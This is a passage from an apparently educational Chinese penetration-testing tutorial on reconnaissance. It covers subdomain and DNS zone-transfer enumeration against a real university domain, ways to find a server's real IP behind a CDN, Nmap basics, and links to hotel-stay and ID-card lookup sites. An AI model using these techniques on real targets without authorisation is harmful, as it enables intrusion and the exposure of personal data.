&apos;8.8.8.8&apos;, &quot;show&quot;: &apos;none&apos;, &quot;keywords&quot;: domain&#125;</span><br></pre></td></tr></table></figure><p><strong>API接口找子域名比爆破更好用的原因：</strong></p><ul><li>大厂SRC 2级往上子域名很多，用字典爆破难以成功</li><li>大厂会有WAF拦截</li></ul><p>域名访问超时直接丢弃结果的，然后再获取网页标题，这个在实际的信息收集中比较实用的，一些 404 403 的资产可以跳过，减少无意义的浪费时间。</p><p>证书透明度(CT)是为了防止证书授权机构(CA)或者其他恶意人员伪造服务器证书而诞生的一个项目。</p><p>CT会要求CA将数字证书(SSL/TLS证书)公开并发布将颁发记录同步到日志服务器中。而日志服务器则会提供给用户一个查找某域名颁发的所有数字证书途径。数字证书中会包含子域名相关的信息。</p><h3 id="DNS-域传送漏洞"><a href="#DNS-域传送漏洞" class="headerlink" title="DNS 域传送漏洞"></a>DNS 域传送漏洞</h3><h4 id="什么是DNS"><a href="#什么是DNS" class="headerlink" title="什么是DNS"></a>什么是DNS</h4><p>DNS(Domain Name System，域名管理系统) 是万维网 WWW 的重要基础。它建立在一个分布式数据库基础之上，在这个数据库里，保存了IP地址和域名的相互映射关系。</p><p>DNS服务器使用的TCP/UDP端口号是53。</p><p>最常用的DNS记录有以下几类：</p><table><thead><tr><th>记录类别</th><th>说明</th></tr></thead><tbody><tr><td>A记录</td><td>IP 地址记录,记录一个域名对应的 IP 地址</td></tr><tr><td>AAAA 记录</td><td>IPv6 地址记录，记录一个域名对应的 IPv6 地址</td></tr><tr><td>CNAME 记录</td><td>别名记录，记录一个主机的别名</td></tr><tr><td>MX 记录</td><td>电子邮件交换记录，记录一个邮件域名对应的IP地址</td></tr><tr><td>NS 记录</td><td>域名服务器记录 ,记录该域名由哪台域名服务器解析</td></tr><tr><td>PTR 记录</td><td>反向记录，也即从 IP 地址到域名的一条记录</td></tr><tr><td>TXT 记录</td><td>记录域名的相关文本信息</td></tr></tbody></table><h4 id="nslookup-命令"><a href="#nslookup-命令" class="headerlink" title="nslookup 命令"></a>nslookup 命令</h4><p>nslookup 命令的使用。仅使用该命令，就可完成 DNS 域传送的测试。</p><p>指定 DNS 查询域名的 IP 地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">~ nslookup www.sqlsec.com 114.114.114.114</span><br><span class="line">Server:        114.114.114.114</span><br><span class="line">Address:    114.114.114.114#53</span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">Name:    www.sqlsec.com</span><br><span class="line">Address: 121.196.37.183</span><br></pre></td></tr></table></figure><p>查询域名所使用的 DNS 服务器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ nslookup www.sqlsec.com -type=ns</span><br><span class="line">Server:        100.100.2.136</span><br><span class="line">Address:    100.100.2.136#53</span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">Name:    www.sqlsec.com</span><br><span class="line">Address: 121.196.37.183</span><br></pre></td></tr></table></figure><p>验证一下看看，是否这个 DNS 服务器开启了 53 端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ nmap 100.100.2.136</span><br><span class="line"></span><br><span class="line">Starting Nmap 6.40 ( http://nmap.org ) at 2020-07-25 14:32 CST</span><br><span class="line">Nmap scan report for 100.100.2.136</span><br><span class="line">Host is up (0.00028s latency).</span><br><span class="line">Not shown: 999 filtered ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">53/tcp open  domain</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 9.26 seconds</span><br></pre></td></tr></table></figure><h4 id="域传送漏洞"><a href="#域传送漏洞" class="headerlink" title="域传送漏洞"></a>域传送漏洞</h4><p>DNS服务器分为：主服务器、备份服务器和缓存服务器。在主备服务器之间同步数据库，需要使用“DNS域传送”。域传送是指备份服务器从主服务器拷贝数据，并用得到的数据更新自身数据库。</p><p>若DNS服务器配置不当，可能导致匿名用户获取某个域的所有记录。造成整个网络的拓扑结构泄露给潜在的攻击者，包括一些安全性较低的内部主机，如测试服务器。凭借这份网络蓝图，攻击者可以节省很少的扫描时间。</p><p>Nslookup 命令检测：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> # 查询解析此域名的dns服务器</span><br><span class="line">nslookup -type=ns xxx.xxx.cn</span><br><span class="line"></span><br><span class="line"># 进入交互</span><br><span class="line">nslookup  </span><br><span class="line"></span><br><span class="line"># 指定dns服务器</span><br><span class="line">server dns.xxx.xx.cn</span><br><span class="line"></span><br><span class="line"># 列出域信息</span><br><span class="line">ls xxx.xxx.cn</span><br></pre></td></tr></table></figure><p>详细案例的输出结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">D:\&gt;nslookup</span><br><span class="line">默认服务器:  public1.114dns.com</span><br><span class="line">Address:  114.114.114.114</span><br><span class="line"></span><br><span class="line">&gt; server dns.nwpu.edu.cn</span><br><span class="line">默认服务器:  dns.nwpu.edu.cn</span><br><span class="line">Address:  202.117.80.2</span><br><span class="line"></span><br><span class="line">&gt; ls nwpu.edu.cn</span><br><span class="line">[dns.nwpu.edu.cn]</span><br><span class="line"> nwpu.edu.cn.                   NS     server = dns.nwpu.edu.cn</span><br><span class="line"> nwpu.edu.cn.                   NS     server = dns1.nwpu.edu.cn</span><br><span class="line"> nwpu.edu.cn.                   NS     server = dns2.nwpu.edu.cn</span><br><span class="line"> nwpu.edu.cn.                   NS     server = dns3.nwpu.edu.cn</span><br><span class="line"> *                              A      222.24.192.99</span><br><span class="line">(... 省略大量的记录)</span><br><span class="line">npunecas                       NS     server = webcomp.npunecas.nwpu.edu.cn</span><br><span class="line"> webcomp.npunecas               A      202.117.85.146</span><br><span class="line"> nwpu03                         A      202.117.80.4</span><br><span class="line"> nwpudb2                        A      222.24.210.149</span><br><span class="line"> poj                            A      192.168.0.248</span><br><span class="line"> portal                         A      61.150.43.10</span><br><span class="line"> portal1                        A      222.24.192.31</span><br><span class="line"> portal2                        A      222.24.192.32</span><br><span class="line"> rei                            A      202.117.85.10</span><br><span class="line"> saip                           NS     server = saipserver.saip.nwpu.edu.cn</span><br><span class="line"> saipserver.saip                A      202.117.85.72</span><br><span class="line"> test                           A      222.24.192.29</span><br><span class="line"> yzb                            A      202.117.85.3</span><br><span class="line"> zsb                            A      202.117.87.130</span><br><span class="line"> zygx                           A      202.117.80.9</span><br></pre></td></tr></table></figure><h2 id="C段与旁站-渐渐没落"><a href="#C段与旁站-渐渐没落" class="headerlink" title="C段与旁站(渐渐没落)"></a>C段与旁站(渐渐没落)</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="什么是-IP-地址"><a href="#什么是-IP-地址" class="headerlink" title="什么是 IP 地址"></a>什么是 IP 地址</h4><p>IP 地址在网络中用于标识一个节点（或者网络设备的接口），一个IPv4地址有32位。</p><table><thead><tr><th>192.</th><th>168.</th><th>10.</th><th>1</th></tr></thead><tbody><tr><td>11000000</td><td>10101000</td><td>00001010</td><td>00000001</td></tr></tbody></table><p>IP地址在最底层运算的时候依然采用的是二进制的方式。</p><h4 id="IP地址的类别"><a href="#IP地址的类别" class="headerlink" title="IP地址的类别"></a>IP地址的类别</h4><p>0.0.0.0 - 255.255.255.255 一共有2的32次方个，因为数量很庞大，所以需要科学的管理。<br>我们一般把IP地址划分为如下5个类别：</p><p><img src="http://qiniuyun.lintstar.top/image-20200725110133223.png" alt="image-20200725110133223"></p><p>正常可以被我们使用的只有A、B、C类<br>A 类</p><ul><li>00000001 - 01111111 : 0 - 127<br>0 是不合法的 IP 地址，所以范围从 1 开始，又因为 127 是一个比较特殊的地址，回环地址，所以 A 类的第一个 8 bit 的值范围为 1-126</li></ul><p>B 类</p><ul><li><p>10000000 - 10111111 : 128 - 191<br>C 类</p></li><li><p>11000000 - 11011111 : 192 - 223<br>所以在内网渗透中，遇到 10 开头的 IP 地址，一般我们称呼它为 A 类地址，172 开头的IP地址为 B 类地址，192 开头的IP地址为 C 类地址。</p></li></ul><h4 id="IP-地址的网络和主机部分"><a href="#IP-地址的网络和主机部分" class="headerlink" title="IP 地址的网络和主机部分"></a>IP 地址的网络和主机部分</h4><p>IP 地址和我们实际生活中的地址类似：</p><p>浙江省杭州市滨江区西兴街道联慧街188号安恒大厦<br>浙江省 | 杭州市 滨江区 西兴街道联慧街188号<br>网络号 | 主机号<br>所以在网络中间对于转发信息的设备来说，他们不关心主机号，所以路由是不关心主机部分的，先把信息送到目标网络区域，然后交给对于的网络区域的设备来处理。</p><p><img src="http://qiniuyun.lintstar.top/image-20200725111813506.png" alt="image-20200725111813506"></p><p>所以一个 IP 地址为：10.1.1.1 ，那么 10.0.0.0 为这个 IP 地址的网络号，1.1.1 为这个 IP 地主的主机号。</p><h4 id="网络掩码"><a href="#网络掩码" class="headerlink" title="网络掩码"></a>网络掩码</h4><ul><li>网络掩码为 32 bits，与 IP 地址的位数是一样的</li><li>网络掩码在二进制的表示上是一堆连续的 1 后面接连续的 0</li><li>值为 1 的 bit 对应 IP 地址中的网络位；为 0 的 bit 对应 IP 地址中的主机位，以此来辅助我们识别一个 IP 地址中的网络与主机位</li></ul><p><img src="http://qiniuyun.lintstar.top/20200802010505.png" alt="20200802010505"></p><h3 id="A-段-B-段-C-段"><a href="#A-段-B-段-C-段" class="headerlink" title="A 段 B 段 C 段"></a>A 段 B 段 C 段</h3><h4 id="黑客所说的C段是什么意思"><a href="#黑客所说的C段是什么意思" class="headerlink" title="黑客所说的C段是什么意思"></a>黑客所说的C段是什么意思</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.1/24</span><br><span class="line">192.168.1.1 - 192.168.1.255</span><br></pre></td></tr></table></figure><p>子网掩码的位数总共有 32 个, /24表示前 24 个为1，其它 8 位都是 0<br>所以 B 段 可以用下面来进行表示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">172.1.1.1/16</span><br><span class="line">172.1.1.1 - 172.1.255.255</span><br></pre></td></tr></table></figure><p>A 段 可以用下面来进行表示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10.1.1.1/8</span><br><span class="line">10.1.1.1 - 10.255.255.255</span><br></pre></td></tr></table></figure><p>一般渗透测试中常用于 C 段探测，内网中会对 B 段进行探测扫描，A 段资产太庞大，探测成本太高。</p><p><strong><code>多地 ping 原理：根据不同地区CDN加速提高响应速度，因此ip会不一样</code></strong></p><h3 id="必应接口-没落"><a href="#必应接口-没落" class="headerlink" title="必应接口(没落)"></a>必应接口(没落)</h3><h4 id="在线查询"><a href="#在线查询" class="headerlink" title="在线查询"></a>在线查询</h4><p><strong><a href="http://www.bug8.me/bing/bing.php" target="_blank" rel="noopener">http://www.bug8.me/bing/bing.php</a></strong></p><p>在线网站使用必应接口查询 C 段和旁站很方便，但是速度方面有点欠缺</p><h4 id="K8-C段旁注工具-6-0"><a href="#K8-C段旁注工具-6-0" class="headerlink" title="K8 C段旁注工具 6.0"></a>K8 C段旁注工具 6.0</h4><p><strong><a href="https://github.com/k8gege/K8tools" target="_blank" rel="noopener">https://github.com/k8gege/K8tools</a></strong></p><p>K8 C 段旁注查询工具 V6.0，但是速度要比在线快很多，解压密码为：k8team</p><h4 id="爱站"><a href="#爱站" class="headerlink" title="爱站"></a>爱站</h4><p><strong><a href="https://dns.aizhan.com/" target="_blank" rel="noopener">https://dns.aizhan.com/</a></strong></p><p>数量上还是比较优势的，而且查询速度也会比较快。</p><h4 id="Fofa"><a href="#Fofa" class="headerlink" title="Fofa"></a>Fofa</h4><p>获取到域名的 IP 地址之后，可以使用 Fofa 来反查域名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=&quot;119.23.84.105&quot; &amp;&amp; type=&quot;subdomain&quot;</span><br></pre></td></tr></table></figure><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>更多适用于内网，因为外网基本上开放端口都比较少，而且带云 WAF。</p><h4 id="HTTPScan"><a href="#HTTPScan" class="headerlink" title="HTTPScan"></a>HTTPScan</h4><p><strong><a href="https://github.com/zer0h/httpscan" target="_blank" rel="noopener">https://github.com/zer0h/httpscan</a></strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install IPy</span><br><span class="line">python httpscan.py 220.191.202.0/24</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/20200802083757.png" alt="20200802083757"></p><h4 id="http端口查询-标题获取"><a href="#http端口查询-标题获取" class="headerlink" title="http端口查询+标题获取"></a>http端口查询+标题获取</h4><p>首先实用快速端口扫描工具：</p><p><img src="http://qiniuyun.lintstar.top/20200802083911.png" alt="20200802083911"></p><p>然后提取出ip地址信息，再放到爱站里面取查询，这样可以得出一个最完整的c段信息。</p><p>当旁站不是CDN的时候，适用于内网，可以使用批量获取网页标题工具来进行查询：</p><p><img src="http://qiniuyun.lintstar.top/1558963651187.png" alt="1558963651187"></p><h2 id="服务器信息查询"><a href="#服务器信息查询" class="headerlink" title="服务器信息查询"></a>服务器信息查询</h2><h3 id="CDN-介绍"><a href="#CDN-介绍" class="headerlink" title="CDN 介绍"></a>CDN 介绍</h3><p>CDN（Content Delivery Network，内容分发网络）将源站的内容发布到接近用户的网络“边缘”，用户可以就近获取所需数据，不仅降低了网络的拥塞状况、提高请求的响应速度，也能够减少源站的负载压力。</p><p><strong>传统的网络访问过程：</strong></p><p><img src="http://qiniuyun.lintstar.top/image-20200725145502796.png" alt="image-20200725145502796"></p><p>访问过程大概如下：</p><pre><code>1.用户输入访问的域名，操作系统向LocalDNS查询域名的ip地址2.LocalDns向RootDNS 查询域名的授权服务器3.RootDNS查询域名记录后，回应给LocalDNS4.LocalDNS将得到的域名ip地址，回应给客户端5.用户得到域名ip地址后，访问站点服务器6.站点服务器应答请求，将内容返回给客户端</code></pre><p><strong>CDN 访问过程：</strong></p><p><img src="http://qiniuyun.lintstar.top/image-20200725145945806.png" alt="image-20200725145945806"></p><p>访问过程大概如下：</p><pre><code>1.用户输入访问的域名，操作系统向 LocalDns 查询域名的 ip 地址2.LocalDns 向 ROOT DNS 查询域名的授权服务器3.ROOT DNS 将域名授权DNS记录回应给 LocalDns4.LocalDns 得到域名记录后，向智能调度DNS查询域名的ip地址5.智能调度DNS 根据一定的算法和策略(比如静态拓扑，容量等),将最适合的CDN节点ip地址回应给 LocalDns6.LocalDns 将得到的域名ip地址，回应给 用户端7.用户得到域名 ip 地址后，访问站点服务器8.CDN节点服务器应答请求，将内容返回给客户端</code></pre><h3 id="CDN-判断与绕过"><a href="#CDN-判断与绕过" class="headerlink" title="CDN 判断与绕过"></a>CDN 判断与绕过</h3><h4 id="ping-命令"><a href="#ping-命令" class="headerlink" title="ping 命令"></a>ping 命令</h4><p>直接 ping 查询地址信息：</p><p><img src="http://qiniuyun.lintstar.top/1558999835083.png" alt="1558999835083"></p><p>有些是直接可以看到waf、cdn等字样的域名</p><p>很多厂商可能让 www 使用cdn，空域名不使用 CDN 缓存。所以直接 ping xxx.com 可能就能得到真实IP</p><h4 id="slookup-查询"><a href="#slookup-查询" class="headerlink" title="slookup 查询"></a>slookup 查询</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 用了 CDN</span><br><span class="line">➜  ~ nslookup www.baidu.com</span><br><span class="line">Server:        10.20.120.150</span><br><span class="line">Address:    10.20.120.150#53</span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">www.baidu.com    canonical name = www.a.shifen.com.</span><br><span class="line">Name:    www.a.shifen.com</span><br><span class="line">Address: 180.101.49.11</span><br><span class="line">Name:    www.a.shifen.com</span><br><span class="line">Address: 180.101.49.12</span><br><span class="line"></span><br><span class="line"># 没有用 CDN</span><br><span class="line">➜  ~ nslookup www.sqlsec.com</span><br><span class="line">Server:        10.20.120.150</span><br><span class="line">Address:    10.20.120.150#53</span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">Name:    www.sqlsec.com</span><br><span class="line">Address: 121.196.37.183</span><br></pre></td></tr></table></figure><p>域名解析结果为多个 ip，多半使用了CDN，是不真实的 ip。</p><h4 id="多地-ping"><a href="#多地-ping" class="headerlink" title="多地 ping"></a>多地 ping</h4><ul><li>爱站超级 ping: <a href="https://ping.aizhan.com/" target="_blank" rel="noopener">https://ping.aizhan.com/</a></li><li>站长之家多地 ping: <a href="http://ping.chinaz.com/" target="_blank" rel="noopener">http://ping.chinaz.com/</a></li><li>解析历史记录查询<br>查询<ul><li>ip 与域名绑定历史记录，可能会发现使用 CDN 之前的目标 ip。</li><li><a href="https://viewdns.info/" target="_blank" rel="noopener">https://viewdns.info/</a></li><li><a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a></li><li><a href="https://sitereport.netcraft.com/" target="_blank" rel="noopener">https://sitereport.netcraft.com/</a></li></ul></li></ul><h4 id="子域名绕过"><a href="#子域名绕过" class="headerlink" title="子域名绕过"></a>子域名绕过</h4><p>很多网站主站的访问量会比较大。所以往往主站都是挂了CDN的，但是分站就不一定了，毕竟CDN要钱，而且也不便宜,企业业务线众多，有些站点的主站使用了CDN，或者部分域名使用了CDN，某些子域名可能未使用，结合之前的子域名爆破来进行收集。</p><h4 id="利用站点功能主动发起请求"><a href="#利用站点功能主动发起请求" class="headerlink" title="利用站点功能主动发起请求"></a>利用站点功能主动发起请求</h4><p>一些网站提供注册服务，可能会验证邮件，还有 RSS 订阅邮件、忘记密码等等 可能服务器本身自带 sendmail 可以直接发送邮件，当然使用第三方的除外（如网易、腾讯的等）通过邮件发送地址往往也能得到服务器 IP</p><h4 id="利用网站漏洞"><a href="#利用网站漏洞" class="headerlink" title="利用网站漏洞"></a>利用网站漏洞</h4><p>如果目标站点存在漏洞，这就没办法避免了。例如 phpinfo 敏感信息泄露、Struts2、网页源代码泄露、svn 信息泄露信、Github 信息泄露等</p><p>若存在 Web 漏洞，服务器主动与我们发起请求连接，我们也能获取目标站点真实 ip，例如 XSS 等</p><h4 id="国外访问"><a href="#国外访问" class="headerlink" title="国外访问"></a>国外访问</h4><p>国内的 CDN 往往只会针对国内用户访问加速，但是国外就不一定了。因此通过国外代理访问就能查看真实 IP 了，或者通过国外的 DNS 解析，可能就能得到真实的 IP</p><h2 id="社工信息收集"><a href="#社工信息收集" class="headerlink" title="社工信息收集"></a>社工信息收集</h2><h3 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h3><p><strong>whois.bugscaner.com</strong></p><p><img src="http://qiniuyun.lintstar.top/20200802084139.png" alt="20200802084139"></p><p><strong>whois.aizhan.com</strong></p><p><strong>whois.chinaz.com</strong></p><h3 id="注册网站查询"><a href="#注册网站查询" class="headerlink" title="注册网站查询"></a>注册网站查询</h3><p><strong><a href="http://www.reg007.com" target="_blank" rel="noopener">www.reg007.com</a></strong></p><h3 id="密码泄露查询"><a href="#密码泄露查询" class="headerlink" title="密码泄露查询"></a>密码泄露查询</h3><p><a href="https://haveibeenpwned.com" target="_blank" rel="noopener">https://haveibeenpwned.com</a></p><h3 id="TG-群信息收集"><a href="#TG-群信息收集" class="headerlink" title="TG 群信息收集"></a>TG 群信息收集</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">关键词 inurl:t.me</span><br></pre></td></tr></table></figure><p><img src="http://qiniuyun.lintstar.top/20200801233335.png" alt="20200801233335"></p><h3 id="开房记录查询"><a href="#开房记录查询" class="headerlink" title="开房记录查询"></a>开房记录查询</h3><p><a href="http://www.cxjlkf.com" target="_blank" rel="noopener">http://www.cxjlkf.com</a></p><h3 id="国家职业资格证查询"><a href="#国家职业资格证查询" class="headerlink" title="国家职业资格证查询"></a>国家职业资格证查询</h3><p><a href="http://zscx.osta.org.cn" target="_blank" rel="noopener">http://zscx.osta.org.cn</a></p><h3 id="其他查询"><a href="#其他查询" class="headerlink" title="其他查询"></a>其他查询</h3><h4 id="身份证查询"><a href="#身份证查询" class="headerlink" title="身份证查询"></a>身份证查询</h4><p><a href="http://www.2cha.com" target="_blank" rel="noopener">http://www.2cha.com</a></p><h4 id="经纬度查询"><a href="#经纬度查询" class="headerlink" title="经纬度查询"></a>经纬度查询</h4><p><a href="http://www.gpsspg.com/maps.htm" target="_blank" rel="noopener">http://www.gpsspg.com/maps.htm</a></p><p><a href="http://map.yanue.net/" target="_blank" rel="noopener">http://map.yanue.net/</a></p><p><a href="http://www.gzhatu.com/jingweidu.html" target="_blank" rel="noopener">http://www.gzhatu.com/jingweidu.html</a></p><h4 id="微信搜索"><a href="#微信搜索" class="headerlink" title="微信搜索"></a>微信搜索</h4><p><a href="https://weixin.sogou.com" target="_blank" rel="noopener">https://weixin.sogou.com</a></p><h4 id="泄露网站查询"><a href="#泄露网站查询" class="headerlink" title="泄露网站查询"></a>泄露网站查询</h4><p><a href="https://haveibeenpwned.com/PwnedWebsites" target="_blank" rel="noopener">https://haveibeenpwned.com/PwnedWebsites</a></p><h4 id="邮件泄露查询"><a href="#邮件泄露查询" class="headerlink" title="邮件泄露查询"></a>邮件泄露查询</h4><p><a href="https://www.hotsheet.com/inoitsu/" target="_blank" rel="noopener">https://www.hotsheet.com/inoitsu/</a></p><h4 id="密码强度检测"><a href="#密码强度检测" class="headerlink" title="密码强度检测"></a>密码强度检测</h4><p><a href="https://passwordsecurity.info" target="_blank" rel="noopener">https://passwordsecurity.info</a></p><p><a href="https://haveibeenpwned.com/Passwords" target="_blank" rel="noopener">https://haveibeenpwned.com/Passwords</a></p><h3 id="Github-信息收集"><a href="#Github-信息收集" class="headerlink" title="Github 信息收集"></a>Github 信息收集</h3><p>可以使用谷歌搜索语法：</p><p><img src="http://qiniuyun.lintstar.top/20200801230948.png" alt="20200801230948"></p><p>也可以使用 Github 自带搜索（推荐）：</p><p><img src="http://qiniuyun.lintstar.top/20200801233524.png" alt="20200801233524"></p><p>linux密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql数据库</span><br><span class="line">password</span><br><span class="line">db_pass</span><br></pre></td></tr></table></figure><p>点code查</p><p><img src="http://qiniuyun.lintstar.top/20200802093603.png" alt="20200802093603"></p><p><a href="https://github.com/xiao1230546/www.zhanglitong.com/blob/b34e59eb93ad419a216093e1705853f054aea1f0/%E5%B9%B3%E5%8F%B0%E8%B5%84%E6%96%99.txt" target="_blank" rel="noopener">https://github.com/xiao1230546/www.zhanglitong.com/blob/b34e59eb93ad419a216093e1705853f054aea1f0/%E5%B9%B3%E5%8F%B0%E8%B5%84%E6%96%99.txt</a></p><h1 id="主动信息收集"><a href="#主动信息收集" class="headerlink" title="主动信息收集"></a>主动信息收集</h1><h2 id="Nmap-与-Masscan"><a href="#Nmap-与-Masscan" class="headerlink" title="Nmap 与 Masscan"></a>Nmap 与 Masscan</h2><h3 id="Nmap-介绍"><a href="#Nmap-介绍" class="headerlink" title="Nmap 介绍"></a>Nmap 介绍</h3><p>官网：<a href="https://nmap.org/" target="_blank" rel="noopener">https://nmap.org/</a></p><p>Nmap 的英文全称是“Nmap Network Mapper”，中文翻译过来就是“网络映射器”。 Nmap 是一款开源的端口扫描神器，它可以快速地扫描大型网络也可以扫描单个主机。</p><p>端口扫描是指人为发送一组端口扫描信息，试图以了解某台计算机的弱点，并了解其提供的计算机网络服务类型。</p><h3 id="端口介绍"><a href="#端口介绍" class="headerlink" title="端口介绍"></a>端口介绍</h3><p>####　TCP 端口</p><p>TCP是一种面向有连接的传输协议，只有确认通信对端存在时，才会发送数据，从而可以控制通信流量的浪费。同时，TCP还充分实现数据传输过程中的各种控制，可以再数据丢包 的时候重发，还可以对次序乱掉的分包进行顺序控制。</p><h4 id="UDP-端口"><a href="#UDP-端口" class="headerlink" title="UDP 端口"></a>UDP 端口</h4><p>UDP传输不提供复杂的控制机制，它利用IP提供面向无连接的通信服务。UDP报文没有可靠性保证，顺序保证，和流量控制，可靠性比较差，传输过程中即使出现包丢失也不会重发。 也正是因为这些，它的资源消耗小，传输速度快，通常音频，视频在传送时用UDP传输较多。</p><h4 id="协议端口"><a href="#协议端口" class="headerlink" title="协议端口"></a>协议端口</h4><p>端口如同是一个房间的门，这个房间有多少个门呢？有65536 个之多，也就是说端口的取值范围是 0~65535 个。本地操作系统会给那些有需求的进程分配协议端口，每个协议端口有一个正整数标识，如 80、139、445 等。</p><table><thead><tr><th>端口</th><th>协议</th></tr></thead><tbody><tr><td>21</td><td>FTP</td></tr><tr><td>22</td><td>SSH</td></tr><tr><td>23</td><td>Tenet 服务</td></tr><tr><td>25</td><td>SMTP 邮件传输协议</td></tr><tr><td>80</td><td>HTTP 服务相关端口</td></tr><tr><td>110</td><td>POP3 E-mail</td></tr><tr><td>135</td><td>共享文件或共享打印机</td></tr><tr><td>443</td><td>HTTP 服务相关常用端口 SSL</td></tr><tr><td>445</td><td>文件或打印机共享服务</td></tr><tr><td>1433</td><td>MS SQL Server 数据库</td></tr><tr><td>1521</td><td>Oracle 数据库</td></tr><tr><td>3306</td><td>MySQL 数据库</td></tr><tr><td>3389</td><td>Windows 远程桌面服务</td></tr><tr><td>5432/5433</td><td>PostgreSQL 数据库端口</td></tr><tr><td>6379</td><td>Redis 存储默认端口</td></tr><tr><td>7001</td><td>Weblogic 默认端口</td></tr><tr><td>8080</td><td>HTTP 服务常用端口</td></tr><tr><td>8000 - 8100</td><td>HTTP 服务常用端口</td></tr><tr><td>9200</td><td>Elasticsearch 默认端口</td></tr><tr><td>11211</td><td>Memcached 分布式缓存系统端口</td></tr></tbody></table><h3 id="端口状态"><a href="#端口状态" class="headerlink" title="端口状态"></a>端口状态</h3><p>Nmap 进行端口扫描的时候，Nmap 会把扫描到的端口信息反馈回来，我们从反馈回来的信息就可以判断目标端口情况。</p><table><thead><tr><th>状态</th><th>说明</th><th></th></tr></thead><tbody><tr><td>Open</td><td>端口对外开放</td></tr><tr><td>Closed</td><td>端口对外关闭</td></tr><tr><td>Fitered</td><td>无法判断</td><td>被防火墙设备拦截过滤</td></tr><tr><td>nfiltered</td><td>未被过滤</td><td>使用 ACK 扫描才可能出现这种情况</td></tr><tr><td>Open\</td><td>Filtered</td><td>不能确定开放或者过滤 可能被专业设备阻止探测了</td></tr><tr><td>Closed\</td><td>Filtered</td><td>不能确定关闭还是被过滤</td></tr></tbody></table><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><p>本节所用到的 Nmap 命令表：</p><table><thead><tr><th>选项</th><th>解释</th></tr></thead><tbody><tr><td>-sP</td><td>Ping 扫描</td></tr><tr><td>-P0/-Pn</td><td>无 Ping 扫描</td></tr><tr><td>-PS</td><td>TCP SYN Ping 扫描</td></tr><tr><td>-PA</td><td>TCP ACK Ping 扫描</td></tr><tr><td>-PU</td><td>UDP Ping 扫描</td></tr><tr><td>-PE;-PP;-PM</td><td>ICMP Ping Types 扫描</td></tr><tr><td>-PR</td><td>ARP Ping 扫描</td></tr><tr><td>-sL</td><td>列表扫描</td></tr><tr><td>-6</td><td>扫描 IPv6 地址</td></tr><tr><td>–traceroute</td><td>路由跟踪</td></tr><tr><td>-PY</td><td>SCTP INIT Ping 扫描</td></tr></tbody></table><h3 id="一个简单的扫描"><a 